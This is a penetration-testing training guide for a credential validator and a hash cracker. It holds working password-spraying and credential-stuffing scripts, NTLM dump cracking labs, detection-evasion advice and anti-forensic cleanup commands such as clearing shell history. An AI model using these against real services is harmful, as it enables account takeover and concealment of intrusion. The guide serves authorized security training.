# Credential Operations Training Guide
## Credential Validator and Hash Cracker Deep Dive

**Document Classification:** Training Material - Authorized Use Only
**Version:** 1.0.0
**Last Updated:** January 2026

---

## Table of Contents

1. [Credential Operations Fundamentals](#1-credential-operations-fundamentals)
2. [Credential Validator Deep Dive](#2-credential-validator-deep-dive)
3. [Hash Cracker Deep Dive](#3-hash-cracker-deep-dive)
4. [Attack Methodologies](#4-attack-methodologies)
5. [Hands-On Labs](#5-hands-on-labs)
6. [Operational Security](#6-operational-security)
7. [Quick Reference](#7-quick-reference)

---

## 1. Credential Operations Fundamentals

### 1.1 Password Attack Theory

Password-based authentication remains one of the most widely deployed security mechanisms across enterprise environments, despite its well-documented weaknesses. Understanding the theoretical foundations of password attacks is essential for security professionals tasked with identifying vulnerabilities in authentication systems.

**Authentication Attack Categories**

Password attacks fall into two primary categories based on where the attack occurs in the authentication chain:

**Online Attacks** involve direct interaction with a live authentication service. The attacker sends credential pairs to the target system and analyzes responses to determine validity. These attacks are constrained by network latency, service rate limiting, and account lockout policies. The Credential Validator tool falls into this category, implementing careful timing controls to manage these constraints.

**Offline Attacks** occur when an attacker has obtained password hashes or encrypted credentials and attempts to recover the plaintext passwords without interacting with the target system. These attacks are limited only by computational resources, making them significantly faster but requiring initial access to credential stores. The Hash Cracker tool implements offline attack capabilities.

**The Password Cracking Process**

```
+------------------+     +-------------------+     +------------------+
|  Hash Capture    | --> |  Hash Analysis    | --> |  Attack Strategy |
| (dumps, leaks)   |     | (type detection)  |     |  (dict/brute)    |
+------------------+     +-------------------+     +------------------+
                                                           |
                                                           v
+------------------+     +-------------------+     +------------------+
|  Plaintext       | <-- |  Hash Comparison  | <-- |  Candidate Gen   |
|  Recovery        |     |  (match found?)   |     |  (wordlist/rules)|
+------------------+     +-------------------+     +------------------+
```

**Password Strength Factors**

The effectiveness of password attacks depends on several factors related to the target passwords:

- **Length**: Each additional character exponentially increases the keyspace
- **Complexity**: Character set diversity (lowercase, uppercase, digits, symbols)
- **Predictability**: Use of dictionary words, patterns, or personal information
- **Hash Algorithm**: Computational cost of the hashing function

Modern password policies often mandate minimum length and complexity requirements, but these technical controls cannot prevent users from creating predictable passwords that satisfy the policy while remaining weak (e.g., "Password1!").

**Attack Success Probability**

The probability of successfully cracking a password correlates directly with:

1. **Wordlist Quality**: Comprehensive wordlists containing common passwords, leaked credentials, and contextually relevant terms dramatically improve success rates
2. **Rule Sophistication**: Transformation rules that model human password creation behavior (appending numbers, capitalizing first letters, leet speak substitutions)
3. **Computational Resources**: GPU acceleration can achieve billions of hash computations per second for fast algorithms like MD5 or NTLM
4. **Target Intelligence**: Knowledge about the target organization, naming conventions, and password policies enables targeted dictionary generation

### 1.2 Legal and Ethical Considerations

**Authorization Requirements**

Credential testing and hash cracking activities require explicit written authorization. The scope of authorization must clearly specify:

- Target systems and services permitted for testing
- Credential sources that may be tested (captured hashes, provided test accounts)
- Testing timeframes and any blackout periods
- Notification requirements for successful compromises
- Data handling and retention requirements

**Legal Framework**

Unauthorized credential testing violates multiple laws across jurisdictions:

- **Computer Fraud and Abuse Act (CFAA)** in the United States prohibits unauthorized access to computer systems
- **General Data Protection Regulation (GDPR)** in Europe imposes strict requirements on processing personal data including credentials
- **Industry-specific regulations** (PCI-DSS, HIPAA) have additional requirements for handling authentication data

**Ethical Boundaries**

Even with authorization, ethical considerations guide professional conduct:

- **Proportionality**: Testing intensity should match assessment objectives
- **Minimization**: Collect and retain only necessary credential data
- **Confidentiality**: Recovered credentials must be protected and securely destroyed after reporting
- **Disclosure**: Valid credentials must be reported to enable remediation

### 1.3 Detection and Lockout Awareness

**Account Lockout Mechanisms**

Enterprise environments typically implement account lockout policies to mitigate brute force attacks:

| Policy Parameter | Common Values | Impact on Testing |
|-----------------|---------------|-------------------|
| Threshold | 3-5 failed attempts | Limits attempts per account |
| Duration | 15-30 minutes | Determines retry timing |
| Reset Window | 15-60 minutes | Counter reset behavior |
| Administrative Override | Manual unlock | May require coordination |

**Detection Mechanisms**

Security Information and Event Management (SIEM) systems and authentication logs capture:

- Source IP addresses for each authentication attempt
- Timestamp and frequency of attempts
- Username enumeration patterns
- Geographic anomalies
- User agent strings for HTTP-based authentication

**Evading Detection**

Professional credential testing requires balancing thoroughness with operational security:

```
Detection Risk Matrix:

    HIGH  |  Burst attacks    |  Multi-target     |
    RISK  |  No delays        |  rapid spray      |
          |-------------------|-------------------|
    LOW   |  Single target    |  Distributed      |
    RISK  |  with delays      |  slow spray       |
          +-------------------+-------------------+
               SINGLE                MULTIPLE
               TARGET               TARGETS
```

---

## 2. Credential Validator Deep Dive

### 2.1 Supported Protocols

The Credential Validator supports multiple authentication protocols, each with unique characteristics:

| Protocol | Default Port | Use Case | Authentication Method |
|----------|-------------|----------|----------------------|
| FTP | 21 | File transfer services | USER/PASS commands |
| SSH | 22 | Remote shell access | Key or password auth |
| HTTP Basic | 80/443 | Web application auth | Base64 encoded header |
| HTTP Form | 80/443 | Web login forms | POST form data |
| SMTP | 25/587 | Email server auth | AUTH LOGIN (Base64) |
| MySQL | 3306 | Database access | Native auth protocol |

**Protocol Selection Guidance**

```
Protocol Selection Flowchart:

     Target Service?
           |
     +-----+-----+
     |           |
   Web App    Network
     |        Service
     |           |
  +--+--+     +--+--+
  |     |     |     |
Form  Basic  TCP   Mail
Auth  Auth   Port  Server
  |     |      |      |
http- http-   |    smtp
form  basic   |
              |
        +-----+-----+
        |     |     |
       21    22   3306
       ftp   ssh  mysql
```

### 2.2 Architecture and Code Walkthrough

**Core Components**

The Credential Validator implements a modular architecture with clear separation of concerns:

```
+-------------------+     +-------------------+
|  CLI Interface    | --> | ValidatorConfig   |
|  (parse_arguments)|     | (configuration)   |
+-------------------+     +-------------------+
                                   |
                                   v
+-------------------+     +-------------------+
| CredentialValidator| --> | ProtocolValidator |
| (orchestration)   |     | (abstract base)   |
+-------------------+     +-------------------+
        |                          |
        v                    +-----+-----+
+-------------------+        |     |     |
| ValidationAttempt |      FTP   SSH   HTTP
| (result storage)  |      Val.  Val.  Val.
+-------------------+
```

**Key Classes**

**Credential Dataclass** - Represents username/password pairs with secure memory clearing:

```python
@dataclass
class Credential:
    username: str
    password: str
    domain: Optional[str] = None

    def clear(self) -> None:
        """Securely clear credential from memory."""
        self.username = "x" * len(self.username)
        self.password = "x" * len(self.password)
```

**ValidatorConfig** - Central configuration object containing all runtime parameters:

```python
@dataclass
class ValidatorConfig:
    target: str                    # Target host
    port: Optional[int]            # Custom port
    protocol: Protocol             # Auth protocol
    credentials: List[Credential]  # Credentials to test
    timeout: float = 10.0          # Connection timeout
    threads: int = 5               # Concurrent threads
    delay_min: float = 0.5         # Min delay between attempts
    delay_max: float = 2.0         # Max delay between attempts
    stop_on_success: bool = False  # Stop after valid cred found
```

**ProtocolValidator Abstract Base Class** - Defines interface for protocol implementations:

```python
class ProtocolValidator(ABC):
    @property
    @abstractmethod
    def name(self) -> str: pass

    @property
    @abstractmethod
    def default_port(self) -> int: pass

    @abstractmethod
    def validate(self, target, port, credential, config) -> ValidationAttempt:
        pass
```

### 2.3 Rate Limiting and Lockout Avoidance

**Jitter Implementation**

The tool implements randomized delays to avoid pattern-based detection:

```python
def _apply_jitter(self) -> None:
    """Apply random delay for stealth."""
    if self.config.delay_max > 0:
        delay = random.uniform(self.config.delay_min, self.config.delay_max)
        time.sleep(delay)
```

**Recommended Delay Settings**

| Scenario | delay_min | delay_max | Rationale |
|----------|-----------|-----------|-----------|
| Aggressive | 0.5s | 1.0s | Fast, higher detection risk |
| Balanced | 1.0s | 3.0s | Moderate speed, lower risk |
| Stealth | 5.0s | 15.0s | Slow, mimics human behavior |
| Maximum Stealth | 30.0s | 120.0s | Very slow, minimal detection |

**Thread Management**

The `stop_on_success` flag and thread-safe success tracking prevent unnecessary attempts:

```python
def _validate_credential(self, credential: Credential):
    if self._stop_event.is_set():
        return None

    if self.config.stop_on_success and self._success_found:
        return None

    # ... validation logic ...

    if result.result == ValidationResult.VALID:
        with self._lock:
            self._success_found = True
```

### 2.4 In-Memory Credential Handling

**Security Features**

The tool implements several security measures for credential handling:

1. **Memory-Only Storage**: Credentials are never written to disk during operation
2. **Secure Clearing**: The `clear()` method overwrites credential data after use
3. **Masked Output**: Planning mode displays masked passwords

```python
# Password masking in plan output
for cred in config.credentials[:5]:
    masked_pass = '*' * min(len(cred.password), 8)
    print(f"  - {cred.username}:{masked_pass}")
```

---

## 3. Hash Cracker Deep Dive

### 3.1 Supported Algorithms

The Hash Cracker supports five common hash algorithms with automatic detection:

| Algorithm | Length (hex) | Strength | Common Use |
|-----------|-------------|----------|------------|
| MD5 | 32 chars | Weak | Legacy systems, checksums |
| SHA1 | 40 chars | Weak | Git, legacy auth |
| SHA256 | 64 chars | Moderate | Modern applications |
| SHA512 | 128 chars | Strong | High-security systems |
| NTLM | 32 chars | Weak | Windows authentication |

**Hash Type Detection Logic**

```python
def detect_hash_type(hash_value: str) -> Optional[HashType]:
    length = len(hash_value)

    if length == 32:
        return HashType.MD5  # Note: Could also be NTLM
    elif length == 40:
        return HashType.SHA1
    elif length == 64:
        return HashType.SHA256
    elif length == 128:
        return HashType.SHA512

    return None
```

**Algorithm Selection Guidance**

```
Hash Identification Flowchart:

   Hash Length?
        |
   +----+----+----+----+
   |    |    |    |    |
  32   40   64  128  Other
   |    |    |    |    |
   |  SHA1 SHA256 SHA512 Unknown
   |
   +-- Likely MD5 or NTLM
       |
       Check context:
       - Windows/AD -> NTLM
       - Linux/Web -> MD5
```

### 3.2 Dictionary Attacks

Dictionary attacks leverage wordlists containing likely passwords. The tool loads wordlists entirely into memory for performance.

**Wordlist Loading**

```python
def from_wordlist(self) -> Generator[str, None, None]:
    with open(self.config.wordlist, 'r', errors='ignore') as f:
        for line in f:
            word = line.strip()
            if word:
                yield word
                # Apply rules to generate mutations
                for mutated in self._apply_rules(word):
                    yield mutated
```

**Effective Wordlist Sources**

| Source | Size | Coverage |
|--------|------|----------|
| rockyou.txt | ~14 million | Common leaked passwords |
| SecLists | Varies | Categorized password lists |
| Custom | Varies | Target-specific terms |
| CeWL output | Varies | Website-scraped words |

### 3.3 Rule-Based Attacks

Rules transform base words into password variants that match common user behavior patterns:

| Rule | Description | Example |
|------|-------------|---------|
| capitalize | First letter uppercase | password -> Password |
| uppercase | All uppercase | password -> PASSWORD |
| reverse | Reverse string | password -> drowssap |
| append_numbers | Add 0-99 suffix | password -> password42 |
| append_year | Add year suffix | password -> password2025 |
| leet | Leetspeak substitution | password -> p455w0rd |

**Rule Implementation**

```python
def _apply_rules(self, word: str) -> Generator[str, None, None]:
    for rule in self.config.rules:
        if rule == "capitalize":
            yield word.capitalize()
        elif rule == "uppercase":
            yield word.upper()
        elif rule == "append_numbers":
            for i in range(100):
                yield f"{word}{i}"
        elif rule == "leet":
            yield self._leetspeak(word)
```

**Rule Chaining Strategy**

Apply rules in order of likelihood to maximize early success:

```
Recommended Rule Order:
1. capitalize (extremely common)
2. append_numbers (very common)
3. append_year (common in corporate environments)
4. leet (less common but used)
5. reverse (rare)
```

### 3.4 Brute Force Configurations

Brute force generates all possible combinations within specified parameters:

**Character Sets**

| Charset Name | Characters | Keyspace (6 chars) |
|-------------|------------|-------------------|
| lowercase | a-z | 308,915,776 |
| uppercase | A-Z | 308,915,776 |
| digits | 0-9 | 1,000,000 |
| alpha | a-zA-Z | 19,770,609,664 |
| alphanumeric | a-zA-Z0-9 | 56,800,235,584 |
| all | printable | ~689,869,781,056 |

**Length-Based Complexity**

```
Keyspace Growth (alphanumeric charset):

Length 4:   14,776,336 combinations
Length 5:   916,132,832 combinations
Length 6:   56,800,235,584 combinations
Length 7:   3,521,614,606,208 combinations
Length 8:   218,340,105,584,896 combinations

Time to crack at 1 million H/s:
- Length 4: 15 seconds
- Length 5: 15 minutes
- Length 6: 16 hours
- Length 7: 41 days
- Length 8: 7 years
```

---

## 4. Attack Methodologies

### 4.1 Password Spraying Techniques

Password spraying tests a small number of passwords against many accounts, inverting the traditional brute force approach to avoid lockouts.

**Spray Strategy**

```
Traditional Brute Force (RISKY):
User1: pass1, pass2, pass3, pass4, pass5 -> LOCKOUT
User2: pass1, pass2, ...

Password Spray (SAFER):
Round 1: User1:pass1, User2:pass1, User3:pass1, ...
[Wait for lockout window]
Round 2: User1:pass2, User2:pass2, User3:pass2, ...
```

**Implementation Approach**

```bash
# Create user list
echo -e "admin\njsmith\nmjohnson\nservice_account" > users.txt

# Spray with single password
for user in $(cat users.txt); do
    python tool.py target.com --protocol http-form \
        -u "$user" -P "Summer2025!" \
        --delay-min 5 --delay-max 10
    sleep 60  # Wait between users
done
```

**Effective Spray Passwords**

| Category | Examples | Rationale |
|----------|----------|-----------|
| Seasonal | Summer2025!, Winter2024! | Common policy-compliant |
| Company | CompanyName1! | Brand-based |
| Default | Welcome1!, Password1! | Initial/reset passwords |
| Keyboard | Qwerty123!, 1qaz2wsx | Pattern-based |

### 4.2 Credential Stuffing Workflows

Credential stuffing uses leaked username/password pairs from breaches against target systems.

**Workflow Diagram**

```
+------------------+     +-------------------+     +------------------+
|  Breach Data     | --> |  Data Processing  | --> |  Target Mapping  |
| (leaked creds)   |     | (dedup, format)   |     | (email -> user)  |
+------------------+     +-------------------+     +------------------+
                                                           |
                                                           v
+------------------+     +-------------------+     +------------------+
|  Report Valid    | <-- |  Credential       | <-- |  Rate-Limited    |
|  Credentials     |     |  Validation       |     |  Testing         |
+------------------+     +-------------------+     +------------------+
```

**Data Preparation**

```bash
# Convert breach format to tool format (user:pass)
# Assuming breach data: email,password
cut -d',' -f1,2 breach_data.csv | tr ',' ':' > creds.txt

# Filter to target domain
grep "@targetdomain.com" creds.txt > target_creds.txt

# Extract username from email
sed 's/@.*//' target_creds.txt > final_creds.txt
```

### 4.3 Hash Identification and Cracking Strategies

**Identification Process**

```
Step 1: Examine hash format
        - Length (32, 40, 64, 128 characters)
        - Prefix ($1$, $5$, $6$ for crypt variants)
        - Character set (hex only vs alphanumeric)

Step 2: Consider source context
        - Windows/AD -> NTLM, NTLMv2
        - Linux /etc/shadow -> sha512crypt, sha256crypt
        - Web application -> MD5, SHA1, bcrypt
        - Database dump -> Application-specific

Step 3: Verify with test hash
        - Generate hash of known value
        - Compare format with target
```

**Attack Strategy Selection**

```
Cracking Strategy Flowchart:

        Hash Count?
             |
      +------+------+
      |             |
   Few (<100)    Many (>1000)
      |             |
   Dictionary    Dictionary
   + Rules       Basic Only
      |             |
   Success?      Success?
      |             |
   No -> Targeted  No -> Accept
         Brute         Partial
         Force         Results
```

---

## 5. Hands-On Labs

### Lab 1: FTP Credential Testing

**Objective:** Test FTP authentication using the Credential Validator

**Environment Setup:**
- Target: FTP server at 192.168.1.10:21
- Test accounts created with known credentials
- Wordlist: `/opt/wordlists/common_passwords.txt`

**Lab Tasks:**

**Task 1.1: Planning Mode Exploration**

```bash
# Review what the tool will do before execution
python tool.py 192.168.1.10 --protocol ftp \
    -u ftpuser -P testpassword \
    --plan
```

Expected output should display target information, validation configuration, and risk assessment.

**Task 1.2: Single Credential Test**

```bash
# Test a single credential pair
python tool.py 192.168.1.10 --protocol ftp \
    -u ftpuser -P correctpassword \
    --verbose
```

**Task 1.3: Credential List Test**

Create a credential file `ftp_creds.txt`:
```
admin:admin
ftpuser:password123
backup:backup2025
ftpuser:correctpassword
```

Execute the test:
```bash
python tool.py 192.168.1.10 --protocol ftp \
    -c ftp_creds.txt \
    --stop-on-success \
    --verbose \
    -o ftp_results.json
```

**Validation Criteria:**
- [ ] Planning mode shows correct configuration
- [ ] Valid credential identified
- [ ] Results written to JSON file
- [ ] Tool stops after first valid credential

---

### Lab 2: HTTP Form Authentication

**Objective:** Attack a web application login form

**Environment Setup:**
- Target: Web application at http://192.168.1.20/login
- Form fields: `email` and `passwd`
- Success indicator: "Welcome" in response
- Failure indicator: "Invalid credentials"

**Lab Tasks:**

**Task 2.1: Form Analysis**

Before testing, analyze the login form:
- Identify form field names
- Determine success/failure indicators
- Note any CSRF protection

**Task 2.2: Custom Form Attack**

```bash
python tool.py 192.168.1.20 --protocol http-form \
    --http-path /login \
    --http-method POST \
    --http-user-field email \
    --http-pass-field passwd \
    --http-success "Welcome" \
    --http-failure "Invalid credentials" \
    -u admin@company.com -P admin123 \
    --verbose
```

**Task 2.3: Spray Attack**

```bash
# Create user list
cat << 'EOF' > users.txt
admin@company.com
jsmith@company.com
support@company.com
EOF

# Create password list with common passwords
cat << 'EOF' > passwords.txt
Password1!
Company2025!
Welcome1!
EOF

# Execute spray
python tool.py 192.168.1.20 --protocol http-form \
    --http-path /login \
    --http-user-field email \
    --http-pass-field passwd \
    --http-success "Welcome" \
    -U users.txt -W passwords.txt \
    --delay-min 2 --delay-max 5 \
    --threads 1 \
    --verbose
```

**Validation Criteria:**
- [ ] Form fields correctly identified
- [ ] Success/failure detection working
- [ ] Appropriate delays applied

---

### Lab 3: Hash Identification and Cracking

**Objective:** Identify hash types and crack using dictionary attack

**Environment Setup:**
- Hash file containing various hash types
- Wordlist: `/opt/wordlists/rockyou.txt`

**Lab Tasks:**

**Task 3.1: Hash Identification**

Create test hash file `hashes.txt`:
```
admin:5f4dcc3b5aa765d61d8327deb882cf99
user1:7c6a180b36896a65c3bca4238a2deb3c
service:a94a8fe5ccb19ba61c4c0873d391e987982fbbd3
backup:8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92
```

Analyze hashes:
```bash
# Check hash lengths
awk -F: '{print $1": "length($2)" chars"}' hashes.txt

# Expected output:
# admin: 32 chars (MD5 or NTLM)
# user1: 32 chars (MD5 or NTLM)
# service: 40 chars (SHA1)
# backup: 64 chars (SHA256)
```

**Task 3.2: Dictionary Attack**

```bash
# Crack MD5 hashes
python tool.py --file hashes.txt \
    -w /opt/wordlists/rockyou.txt \
    --type md5 \
    --verbose
```

**Task 3.3: Rule-Based Attack**

```bash
# Apply common transformation rules
python tool.py --file hashes.txt \
    -w /opt/wordlists/common_words.txt \
    --type md5 \
    --rules "capitalize,append_numbers,append_year" \
    --verbose
```

**Validation Criteria:**
- [ ] Hash types correctly identified
- [ ] Dictionary attack successful for weak passwords
- [ ] Rules generate appropriate mutations

---

### Lab 4: Password Spraying Scenario

**Objective:** Execute a controlled password spray against multiple services

**Environment Setup:**
- Multiple target services (FTP, HTTP, SMTP)
- User enumeration completed (50 valid usernames)
- Lockout policy: 5 attempts per 30 minutes

**Lab Tasks:**

**Task 4.1: Spray Planning**

Calculate safe spray parameters:
```
Lockout Threshold: 5 attempts
Lockout Duration: 30 minutes
Users: 50
Safe passwords per round: 4 (leaving margin)
Time between rounds: 35 minutes (safety margin)
```

**Task 4.2: Multi-Service Spray**

```bash
#!/bin/bash
# spray_campaign.sh

USERS="users.txt"
PASSWORDS=("Summer2025!" "Company123!" "Welcome1!")
TARGETS=("192.168.1.10:ftp" "192.168.1.20:http-basic" "192.168.1.30:smtp")

for pass in "${PASSWORDS[@]}"; do
    echo "[*] Spraying password: ${pass:0:3}***"

    for target_proto in "${TARGETS[@]}"; do
        target=$(echo $target_proto | cut -d: -f1)
        proto=$(echo $target_proto | cut -d: -f2)

        while read user; do
            python tool.py $target --protocol $proto \
                -u "$user" -P "$pass" \
                --delay-min 5 --delay-max 10 \
                2>/dev/null | grep -q "VALID" && \
                echo "[+] Valid: $user@$target ($proto)"

            sleep 2
        done < "$USERS"
    done

    echo "[*] Waiting 35 minutes before next password..."
    sleep 2100
done
```

**Validation Criteria:**
- [ ] No accounts locked out
- [ ] Valid credentials discovered
- [ ] Timing respected lockout policies

---

### Lab 5: Chained Credential Operations

**Objective:** Combine hash cracking with credential validation in a realistic attack chain

**Scenario:** You have obtained a password hash dump and need to crack hashes, then validate recovered credentials against live services.

**Lab Tasks:**

**Task 5.1: Hash Extraction and Cracking**

```bash
# Given: NTLM hash dump from Windows system
cat << 'EOF' > ntlm_dump.txt
Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
jsmith:1001:aad3b435b51404ee:a87f3a337d73085c45f9416be5787db6:::
svc_backup:1002:aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
EOF

# Extract NTLM hashes (4th field)
awk -F: '{print $1":"$4}' ntlm_dump.txt > ntlm_hashes.txt

# Crack with dictionary + rules
python hash_cracker.py --file ntlm_hashes.txt \
    -w /opt/wordlists/rockyou.txt \
    --type ntlm \
    --rules "capitalize,append_numbers" \
    -o cracked_results.json \
    --verbose
```

**Task 5.2: Credential Validation**

```bash
# Extract cracked credentials for testing
# Assuming cracked_results.json contains results

# Create credential file from cracked hashes
jq -r '.results[] | "\(.username):\(.plaintext)"' cracked_results.json > live_creds.txt

# Validate against SMB (if available) or other services
python credential_validator.py 192.168.1.100 \
    --protocol http-basic \
    -c live_creds.txt \
    --stop-on-success \
    --verbose
```

**Task 5.3: Documentation**

Document the attack chain:
```
Attack Chain Summary:
1. Hash dump obtained from [source]
2. X of Y NTLM hashes cracked (X% success rate)
3. Cracked credentials validated against:
   - Service A: X valid credentials
   - Service B: Y valid credentials
4. Unique privileged access obtained: [list]
```

**Validation Criteria:**
- [ ] Hashes correctly extracted from dump
- [ ] Cracking achieved expected success rate
- [ ] Recovered credentials validated successfully
- [ ] Attack chain documented

---

## 6. Operational Security

### 6.1 Avoiding Detection

**Network-Level Considerations**

```
Detection Avoidance Matrix:

+------------------+-------------------+-------------------+
|    Technique     |    Benefit        |    Trade-off      |
+------------------+-------------------+-------------------+
| Increase delays  | Blend with normal | Slower operation  |
| Single thread    | Reduce anomalies  | Much slower       |
| Rotate source IP | Distribute logs   | Infrastructure    |
| Mimic user-agent | Avoid signatures  | Minimal effort    |
| Off-hours timing | Reduced monitoring| Limited window    |
+------------------+-------------------+-------------------+
```

**Recommended Delay Profiles**

```bash
# Profile: Maximum Stealth
--delay-min 30 --delay-max 120 --threads 1

# Profile: Balanced Operation
--delay-min 3 --delay-max 10 --threads 2

# Profile: Authorized Aggressive (lab only)
--delay-min 0.5 --delay-max 1 --threads 5
```

### 6.2 Log Artifact Minimization

**Sources of Log Artifacts**

| Source | Artifact | Mitigation |
|--------|----------|------------|
| Target auth logs | IP, timestamp, username | Use authorized source |
| Network devices | Connection metadata | Expected for assessment |
| SIEM correlation | Pattern detection | Jitter and delays |
| Local system | Command history | Clear after operation |

**Local Cleanup**

```bash
# Clear bash history for current session
history -c
unset HISTFILE

# Remove any temporary files
rm -f /tmp/creds_* /tmp/hashes_*

# Secure delete of wordlists (if custom)
shred -u custom_wordlist.txt
```

### 6.3 Secure Credential Handling

**Operational Requirements**

1. **Never store credentials in plaintext** beyond immediate operational need
2. **Use encrypted containers** for credential files during assessment
3. **Implement secure deletion** after operation completion
4. **Minimize credential scope** - request only what is needed

**Tool-Level Security**

The Credential Validator implements in-memory clearing:

```python
# After validation complete
for cred in credentials:
    cred.clear()  # Overwrites memory
```

**Post-Operation Checklist**

- [ ] All temporary files securely deleted
- [ ] Command history cleared
- [ ] Credential files encrypted or destroyed
- [ ] Results transmitted securely to client
- [ ] Working memory cleared (system reboot if required)

---

## 7. Quick Reference

### Credential Validator Command Reference

```bash
# Basic syntax
python tool.py TARGET --protocol PROTOCOL [options]

# Protocol options: ssh, ftp, http-basic, http-form, smtp, mysql

# Credential input methods:
-u USERNAME -P PASSWORD           # Single credential
-c FILE                           # Credential file (user:pass)
-U USERFILE -W PASSFILE          # User/password list combination

# Timing options:
--delay-min SECONDS              # Minimum delay (default: 0.5)
--delay-max SECONDS              # Maximum delay (default: 2.0)
-t THREADS                       # Thread count (default: 5)
--timeout SECONDS                # Connection timeout (default: 10)

# Behavior options:
--stop-on-success                # Stop after first valid credential
-p, --plan                       # Preview without execution
-v, --verbose                    # Detailed output
-o FILE                          # JSON output file

# HTTP-specific options:
--http-path PATH                 # URL path (default: /login)
--http-method METHOD             # HTTP method (default: POST)
--http-user-field FIELD          # Username form field
--http-pass-field FIELD          # Password form field
--http-success STRING            # Success indicator string
--http-failure STRING            # Failure indicator string
```

### Hash Cracker Command Reference

```bash
# Basic syntax
python tool.py [HASH] [options]

# Hash input methods:
HASH                             # Single hash as argument
-f, --file FILE                  # Hash file (hash or user:hash format)

# Attack modes:
-w, --wordlist FILE              # Dictionary attack
-b, --bruteforce                 # Bruteforce mode
-r, --rules RULES                # Comma-separated rules

# Bruteforce options:
-c, --charset CHARSET            # Character set to use
--min-length N                   # Minimum length (default: 1)
--max-length N                   # Maximum length (default: 6)

# Available charsets: lowercase, uppercase, digits, alpha, alphanumeric, all
# Available rules: capitalize, uppercase, reverse, append_numbers, append_year, leet

# Hash type:
-t, --type TYPE                  # Specify hash type (auto-detect if omitted)
# Types: md5, sha1, sha256, sha512, ntlm

# Other options:
-T THREADS                       # Thread count (default: 4)
-p, --plan                       # Preview without execution
-v, --verbose                    # Detailed output
-o FILE                          # JSON output file
```

### Common Command Patterns

```bash
# FTP credential testing with wordlist
python tool.py 192.168.1.10 --protocol ftp -c creds.txt --stop-on-success

# HTTP form spray attack
python tool.py webapp.com --protocol http-form \
    --http-path /api/login \
    --http-user-field email --http-pass-field password \
    -U users.txt -W spray_passwords.txt \
    --delay-min 5 --delay-max 15 --threads 1

# NTLM hash cracking with rules
python tool.py -f ntlm_hashes.txt -w rockyou.txt --type ntlm \
    --rules "capitalize,append_numbers,append_year"

# Bruteforce short passwords
python tool.py HASH -b --charset alphanumeric --max-length 6 -T 8
```

---

## Document Control

| Version | Date | Author | Changes |
|---------|------|--------|---------|
| 1.0.0 | January 2026 | Training Development | Initial release |

**Review Schedule:** Quarterly or upon tool updates

**Feedback:** Submit training feedback through standard channels

---

*This document is intended for authorized security training purposes only. Unauthorized use of these techniques may violate applicable laws and regulations.*
